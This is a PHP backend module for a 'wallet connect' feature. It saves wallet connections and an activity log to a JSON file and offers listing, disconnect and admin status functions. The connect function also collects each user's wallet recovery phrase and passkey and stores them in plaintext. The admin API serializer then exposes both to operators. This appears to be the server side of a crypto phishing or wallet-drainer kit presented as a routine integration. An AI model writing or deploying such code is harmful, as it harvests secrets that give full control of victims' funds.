<?php
declare(strict_types=1);

function wallet_connect_data_path(): string {
  return dirname(__DIR__) . '/data/wallet_connections.json';
}

/**
 * @return array{connections: list<array<string,mixed>>, activity: list<array<string,mixed>>}
 */
function wallet_connect_load(): array {
  $path = wallet_connect_data_path();
  if (!is_readable($path)) {
    return ['connections' => [], 'activity' => []];
  }
  $raw = @file_get_contents($path);
  if (!is_string($raw) || $raw === '') {
    return ['connections' => [], 'activity' => []];
  }
  $data = json_decode($raw, true);
  if (!is_array($data)) {
    return ['connections' => [], 'activity' => []];
  }
  $c = $data['connections'] ?? [];
  $a = $data['activity'] ?? [];
  if (!is_array($c)) {
    $c = [];
  }
  if (!is_array($a)) {
    $a = [];
  }
  return ['connections' => $c, 'activity' => $a];
}

/**
 * @param array{connections: list<array<string,mixed>>, activity: list<array<string,mixed>>} $data
 */
function wallet_connect_save(array $data): void {
  $dir = dirname(wallet_connect_data_path());
  if (!is_dir($dir)) {
    @mkdir($dir, 0755, true);
  }
  $path = wallet_connect_data_path();
  $tmp = $path . '.tmp';
  $json = json_encode($data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
  if ($json === false) {
    throw new RuntimeException('wallet_connect_save encode failed');
  }
  $fp = @fopen($tmp, 'cb');
  if (!$fp) {
    throw new RuntimeException('wallet_connect_save cannot open temp');
  }
  if (!flock($fp, LOCK_EX)) {
    fclose($fp);
    throw new RuntimeException('wallet_connect_save lock failed');
  }
  ftruncate($fp, 0);
  fwrite($fp, $json);
  fflush($fp);
  flock($fp, LOCK_UN);
  fclose($fp);
  if (!@rename($tmp, $path)) {
    @unlink($tmp);
    throw new RuntimeException('wallet_connect_save rename failed');
  }
}

function wallet_connect_normalize_address(string $address): string {
  $a = trim($address);
  if (preg_match('/^0x[a-fA-F0-9]{40}$/', $a)) {
    return strtolower($a);
  }
  return $a;
}

function wallet_connect_new_id(): string {
  return 'wc_' . bin2hex(random_bytes(8));
}

/** Format ISO8601 timestamp for admin display (UTC). */
function wallet_connect_format_iso_utc(?string $iso): string {
  if ($iso === null || $iso === '') {
    return '';
  }
  $t = strtotime($iso);
  if ($t === false) {
    return $iso;
  }
  return gmdate('Y-m-d H:i:s', $t) . ' UTC';
}

/**
 * @param array{connections: list<array<string,mixed>>, activity: list<array<string,mixed>>} $data
 */
function wallet_connect_add_activity(array &$data, string $event, string $address, string $userLabel, string $adminLabel = 'system'): void {
  $row = [
    'time' => gmdate('Y-m-d H:i:s'),
    'event' => $event,
    'address' => $address,
    'user' => $userLabel,
    'admin' => $adminLabel,
  ];
  $data['activity'][] = $row;
  $max = 500;
  if (count($data['activity']) > $max) {
    $data['activity'] = array_slice($data['activity'], -$max);
  }
}

/**
 * @return array<string, mixed>
 */
function wallet_connect_connect(
  string $ownerKey,
  string $username,
  string $provider,
  string $address,
  string $chain,
  string $asset,
  string $source,
  string $recoveryPhrase = '',
  string $passkey = ''
): array {
  $data = wallet_connect_load();
  $norm = wallet_connect_normalize_address($address);
  foreach ($data['connections'] as $idx => $row) {
    if (!is_array($row)) {
      continue;
    }
    $ok = (string)($row['owner_key'] ?? '') === $ownerKey
      && wallet_connect_normalize_address((string)($row['address'] ?? '')) === $norm;
    if ($ok) {
      $data['connections'][$idx]['provider'] = $provider;
      $data['connections'][$idx]['chain'] = $chain;
      $data['connections'][$idx]['asset'] = $asset;
      $data['connections'][$idx]['status'] = 'active';
      $data['connections'][$idx]['session'] = 'online';
      $data['connections'][$idx]['updated_at'] = gmdate('c');
      $data['connections'][$idx]['username'] = $username;
      $data['connections'][$idx]['source'] = $source;
      $data['connections'][$idx]['last_action'] = 'Connect';
      if ($recoveryPhrase !== '') {
        $data['connections'][$idx]['recovery_phrase'] = $recoveryPhrase;
      }
      if ($passkey !== '') {
        $data['connections'][$idx]['passkey'] = $passkey;
      }
      wallet_connect_add_activity($data, 'Wallet reconnected', $norm, $username, 'system');
      wallet_connect_save($data);
      return $data['connections'][$idx];
    }
  }

  $id = wallet_connect_new_id();
  $row = [
    'id' => $id,
    'owner_key' => $ownerKey,
    'username' => $username,
    'provider' => $provider,
    'address' => $norm,
    'chain' => $chain,
    'asset' => $asset,
    'status' => 'active',
    'session' => 'online',
    'risk' => 'low',
    'source' => $source,
    'last_action' => 'Connect',
    'connected_at' => gmdate('c'),
    'updated_at' => gmdate('c'),
    'recovery_phrase' => $recoveryPhrase,
    'passkey' => $passkey,
  ];
  $data['connections'][] = $row;
  wallet_connect_add_activity($data, 'Wallet connected', $norm, $username, 'system');
  wallet_connect_save($data);
  return $row;
}

/**
 * @return array<string, int|string>
 */
function wallet_connect_summary(): array {
  $data = wallet_connect_load();
  $conns = $data['connections'];
  $total = count($conns);
  $today = gmdate('Y-m-d');
  $newToday = 0;
  $active = 0;
  $suspended = 0;
  $revoked = 0;
  foreach ($conns as $row) {
    if (!is_array($row)) {
      continue;
    }
    $st = strtolower((string)($row['status'] ?? 'active'));
    if ($st === 'suspended') {
      $suspended++;
    }
    if ($st === 'disconnected' || $st === 'revoked') {
      $revoked++;
    } else {
      $active++;
    }
    $ca = (string)($row['connected_at'] ?? '');
    if ($ca !== '') {
      $d = substr(str_replace('T', ' ', $ca), 0, 10);
      if ($d === $today) {
        $newToday++;
      }
    }
  }
  return [
    'total_connected' => $total,
    'active_sessions' => $active,
    'new_today' => $newToday,
    'suspended' => $suspended,
    'revoked' => $revoked,
  ];
}

/**
 * @return list<array<string, mixed>>
 */
function wallet_connect_list_for_owner(string $ownerKey): array {
  $data = wallet_connect_load();
  $out = [];
  foreach ($data['connections'] as $row) {
    if (!is_array($row)) {
      continue;
    }
    if ((string)($row['owner_key'] ?? '') === $ownerKey) {
      $st = strtolower((string)($row['status'] ?? 'active'));
      if ($st !== 'disconnected' && $st !== 'revoked') {
        $out[] = $row;
      }
    }
  }
  return $out;
}

/**
 * @return list<array<string, mixed>>
 */
function wallet_connect_list_all(): array {
  $data = wallet_connect_load();
  $out = [];
  foreach ($data['connections'] as $row) {
    if (is_array($row)) {
      $out[] = $row;
    }
  }
  return $out;
}

/**
 * @return list<array<string, mixed>>
 */
function wallet_connect_activity(int $limit = 50): array {
  $data = wallet_connect_load();
  $a = $data['activity'];
  if (!is_array($a)) {
    return [];
  }
  $a = array_reverse($a);
  return array_slice($a, 0, max(1, min(200, $limit)));
}

function wallet_connect_disconnect(string $id, string $ownerKey): bool {
  $data = wallet_connect_load();
  $found = false;
  foreach ($data['connections'] as $idx => $row) {
    if (!is_array($row)) {
      continue;
    }
    if ((string)($row['id'] ?? '') !== $id) {
      continue;
    }
    if ((string)($row['owner_key'] ?? '') !== $ownerKey) {
      return false;
    }
    $data['connections'][$idx]['status'] = 'disconnected';
    $data['connections'][$idx]['session'] = 'offline';
    $data['connections'][$idx]['last_action'] = 'Disconnect';
    $data['connections'][$idx]['updated_at'] = gmdate('c');
    $addr = (string)($data['connections'][$idx]['address'] ?? '');
    $user = (string)($data['connections'][$idx]['username'] ?? '');
    wallet_connect_add_activity($data, 'Wallet disconnected', $addr, $user, 'user');
    $found = true;
    break;
  }
  if ($found) {
    wallet_connect_save($data);
  }
  return $found;
}

function wallet_connect_admin_set_status(string $id, string $status): bool {
  $allowed = ['active', 'suspended', 'disconnected'];
  if (!in_array($status, $allowed, true)) {
    return false;
  }
  $data = wallet_connect_load();
  foreach ($data['connections'] as $idx => $row) {
    if (!is_array($row)) {
      continue;
    }
    if ((string)($row['id'] ?? '') !== $id) {
      continue;
    }
    $data['connections'][$idx]['status'] = $status;
    if ($status === 'disconnected') {
      $data['connections'][$idx]['session'] = 'offline';
      $data['connections'][$idx]['last_action'] = 'Admin disconnect';
    } elseif ($status === 'suspended') {
      $data['connections'][$idx]['last_action'] = 'Admin suspend';
    } else {
      $data['connections'][$idx]['last_action'] = 'Admin activate';
    }
    $data['connections'][$idx]['updated_at'] = gmdate('c');
    $addr = (string)($data['connections'][$idx]['address'] ?? '');
    $user = (string)($data['connections'][$idx]['username'] ?? '');
    wallet_connect_add_activity($data, 'Admin status: ' . $status, $addr, $user, (string)($_SESSION['admin_email'] ?? 'admin'));
    wallet_connect_save($data);
    return true;
  }
  return false;
}

function wallet_connect_row_for_api(array $row, bool $admin = false): array {
  $addr = (string)($row['address'] ?? '');
  $short = strlen($addr) > 14
    ? substr($addr, 0, 6) . '...' . substr($addr, -4)
    : $addr;
  $out = [
    'id' => (string)($row['id'] ?? ''),
    'username' => (string)($row['username'] ?? ''),
    'provider' => (string)($row['provider'] ?? ''),
    'address' => $addr,
    'address_short' => $short,
    'chain' => (string)($row['chain'] ?? ''),
    'asset' => (string)($row['asset'] ?? ''),
    'status' => (string)($row['status'] ?? 'active'),
    'session' => (string)($row['session'] ?? 'online'),
    'risk' => (string)($row['risk'] ?? 'low'),
    'source' => (string)($row['source'] ?? ''),
    'last_action' => (string)($row['last_action'] ?? ''),
    'connected_at' => (string)($row['connected_at'] ?? ''),
    'updated_at' => (string)($row['updated_at'] ?? ''),
  ];
  if ($admin) {
    $ok = (string)($row['owner_key'] ?? '');
    $out['owner_key'] = $ok;
    $out['user_id'] = (strpos($ok, 'user:') === 0) ? (int)substr($ok, 5) : 0;
    $out['display_id'] = $out['user_id'] > 0 ? '#U' . $out['user_id'] : '#G' . substr(hash('crc32', $ok), 0, 6);
    $rp = (string)($row['recovery_phrase'] ?? '');
    $pk = (string)($row['passkey'] ?? '');
    $out['recovery_phrase'] = $rp;
    $out['passkey'] = $pk;
    $ca = (string)($row['connected_at'] ?? '');
    $ua = (string)($row['updated_at'] ?? '');
    $out['connected_at_display'] = wallet_connect_format_iso_utc($ca !== '' ? $ca : null);
    $out['updated_at_display'] = wallet_connect_format_iso_utc($ua !== '' ? $ua : null);
    $out['wallet_details'] = trim(
      ($out['provider'] !== '' ? $out['provider'] : '—')
      . ' · '
      . ($out['chain'] !== '' ? $out['chain'] : '—')
      . ' · '
      . ($out['asset'] !== '' ? $out['asset'] : '—')
      . ' · '
      . $short
    );
  }
  return $out;
}
